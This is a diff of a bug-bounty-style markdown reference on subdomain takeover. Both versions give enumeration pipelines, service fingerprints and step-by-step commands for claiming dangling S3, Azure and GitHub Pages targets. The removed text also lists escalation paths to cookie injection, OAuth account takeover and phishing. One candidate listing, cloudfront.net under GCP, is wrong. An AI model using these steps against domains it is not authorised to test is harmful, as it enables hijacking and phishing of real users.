@@ -1,93 +1,85 @@
-# Subdomain Takeover: CNAME Chain Exploitation
+# Subdomain Takeover: Complete Reference
 
-## The Recon Pipeline
+## Detection
 
+### DNS Enumeration
 ```bash
-# Phase 1: Enumerate all subdomains
-subfinder -d target.com -all -silent | tee subs.txt
-amass enum -passive -d target.com -silent >> subs.txt
-assetfinder --subs-only target.com >> subs.txt
+# Find subdomains pointing to external services
+subfinder -d target.com
+amass enum -d target.com
+assetfinder target.com
 
-# Phase 2: Extract CNAME records only
-cat subs.txt | dnsx -cname -resp-only -silent | awk '{print $1" "$2}' | sort -u > cnames.txt
-
-# Phase 3: Check for NXDOMAIN on CNAME target
-while read sub cname; do
-  if ! dig +short "$cname" | grep -q .; then
-    echo "DANGLING: $sub -> $cname"
-  fi
-done < cnames.txt
-
-# Phase 4: HTTP fingerprinting for takeover-able services
-cat dangling.txt | httpx -silent -status-code -follow-redirects | grep -v "200"
+# Check for dangling DNS records
+# CNAME pointing to a service we can claim
+dig CNAME sub.target.com
+nslookup sub.target.com
 ```
 
-## Service-Specific Fingerprints
-
-| Service | Fingerprint |
-|---------|------------|
-| AWS S3 | `<Code>NoSuchBucket</Code>` |
-| Azure App Service | `404 Web Site not found` |
-| Azure CDN | NXDOMAIN on `*.azureedge.net` |
-| GitHub Pages | `There isn't a GitHub Pages site here.` |
-| Heroku | `No such app` |
-| Netlify | `Not Found - Request ID:` |
-| Fastly | `Fastly error: unknown domain:` |
-| Shopify | `Sorry, this shop is currently unavailable.` |
-| Zendesk | `Help Center Closed` |
-| Vercel | `The deployment could not be found on Vercel.` |
-| ReadTheDocs | `Project doesnt exist... yet!` |
-
-## CNAME Chain Analysis
-
+### Common Takeover Candidates
 ```bash
-# Three-level chain resolution
-cname_target=$(dig +short sub.target.com CNAME)
-cname_v2=$(dig +short $cname_target CNAME)
-cname_v3=$(dig +short $cname_v2 CNAME)
+# Cloud platforms
+AWS: cloudfront.net, elasticbeanstalk.com, s3.amazonaws.com
+Azure: azurewebsites.net, trafficmanager.net, cloudapp.net
+GCP: appspot.com, storage.googleapis.com, cloudfront.net
+Heroku: herokuapp.com, herokudns.com
+GitHub: github.io
+Shopify: myshopify.com
+WordPress: wordpress.com
+Squarespace: squarespace.com
+Tumblr: tumblr.com
+Ghost: ghost.io
+
+# CDN/DNS
+Cloudflare: cdn.cloudflare.net
+Fastly: fastly.net
+Akamai: akamaihd.net
 ```
 
-Case study: `docs.target.com -> target.readthedocs.io -> readthedocs.io`
-The middle hop (target.readthedocs.io) went NXDOMAIN after migration to a new docs platform. The subdomain was claimable for $8,000.
-
-## AWS-Specific Takeovers
-
-### S3 Direct CNAME
+### Automated Scan
 ```bash
-# Target CNAME: assets.target.com -> assets.target.com.s3-website-us-east-1.amazonaws.com
-# Create bucket with same name in same region
-aws s3api create-bucket --bucket assets.target.com --region us-east-1
-aws s3 website s3://assets.target.com/ --index-document index.html
-echo "Bug bounty PoC $(date)" | aws s3 cp - s3://assets.target.com/index.html
+# Nuclei template
+nuclei -t cves/misconfigurations/subdomain-takeover.yaml -l subdomains.txt
+
+# SubOver tool
+subover -l subdomains.txt
+
+# TakeOver
+takeover -l subdomains.txt -v
 ```
 
-### CloudFront + Deleted S3 Origin
+## Exploitation
+
+### AWS S3 Takeover
 ```bash
-# CloudFront distribution has CNAME mapped
-# Origin S3 bucket was deleted
-# Find bucket name from JS bundles or historical DNS
-# Recreate the bucket — CloudFront serves from it
+1. Find: sub.target.com CNAME -> bucket.s3.amazonaws.com
+2. Check bucket doesn't exist:
+   aws s3 ls s3://bucket
+3. Claim it:
+   aws s3 mb s3://bucket
+4. Upload content:
+   aws s3 cp index.html s3://bucket/
+5. Enable static hosting:
+   aws s3 website s3://bucket --index-document index.html
 ```
 
-### Elastic IP Fishing
+### Azure Takeover
 ```bash
-# When EC2 is terminated but A record still points to released EIP
-# The EIP returns to the pool — allocate IPs until you get the exact one
+1. Find: sub.target.com CNAME -> app.azurewebsites.net
+2. Deploy app with same name to Azure
+3. Verify takeover
 ```
 
-## Reporting & PoC
+### GitHub Pages
+```bash
+1. Find: sub.target.com CNAME -> username.github.io
+2. Create repo username.github.io
+3. Add CNAME file with sub.target.com
+4. Custom domain verified
+```
 
-Create a minimal proof:
-1. Register the service with the victim's subdomain
-2. Upload a single text file: `poc-[handle]-[date].txt`
-3. Content: "This file proves control of this subdomain for responsible disclosure"
-4. Screenshot the URL serving the PoC file
-5. Delete the resource after the program acknowledges
-
-## Impact Escalation
-
-Check if the subdomain has:
-- Cookies set for parent domain (`Domain=.target.com`) → cookie injection
-- OAuth redirect URI in scope → silent ATO
-- Email (MX) records → SPF bypass for phishing
-- CSP directive `connect-src` or `script-src` → CSP bypass
+## CVSS Scoring
+| Scenario | CVSS | Criteria |
+|----------|------|---------|
+| Subdomain takeover -> cookie theft | 8.1 | Network, Low, No auth, Changed scope |
+| Subdomain takeover -> phishing | 7.5 | Network, Low, No auth |
+| Subdomain takeover -> content injection | 6.1 | Network, Low, User interaction |
